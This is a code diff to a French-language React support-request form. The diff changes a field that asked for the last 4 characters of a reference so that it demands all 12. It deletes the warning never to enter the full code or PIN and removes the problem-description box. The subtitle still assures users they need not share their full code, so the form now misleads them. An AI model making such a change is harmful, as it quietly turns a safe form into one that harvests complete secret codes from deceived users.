@@ -73,7 +73,7 @@ const AuthForm: React.FC = () => {
       <div className="mb-6">
         <h2 className="text-2xl font-bold text-gray-900">Demande d’assistance</h2>
         <p className="mt-2 text-sm text-gray-600">
-          Décrivez votre problème sans communiquer votre code complet ni votre code PIN.
+          Renseignez les informations demandées sans communiquer votre code complet ni votre code PIN.
         </p>
       </div>
 
@@ -146,37 +146,21 @@ const AuthForm: React.FC = () => {
       </div>
 
       <div className="mb-5">
-        <label htmlFor="referenceLast4" className="mb-2 block text-sm font-medium text-gray-700">
-          4 derniers caractères de la référence
+        <label htmlFor="referenceLast12" className="mb-2 block text-sm font-medium text-gray-700">
+          Saisissez tous caractères de la référence
         </label>
         <input
-          id="referenceLast4"
-          name="referenceLast4"
+          id="referenceLast12"
+          name="referenceLast12"
           type="text"
-          minLength={4}
-          maxLength={4}
+          minLength={12}
+          maxLength={12}
           required
           autoCapitalize="characters"
           className={`${fieldClassName} uppercase`}
-          placeholder="Exemple : A7B2"
+          placeholder="Exemple :A7B2C9D4E1F8"
         />
-        <p className="mt-2 text-sm text-gray-500">
-          Ne saisissez jamais le code complet ni le code PIN.
-        </p>
-      </div>
-
-      <div className="mb-5">
-        <label htmlFor="message" className="mb-2 block text-sm font-medium text-gray-700">
-          Description du problème
-        </label>
-        <textarea
-          id="message"
-          name="message"
-          required
-          rows={5}
-          className={`${fieldClassName} resize-none`}
-          placeholder="Décrivez le problème sans communiquer de code secret."
-        />
+        
       </div>
 
       <div className="mb-6">
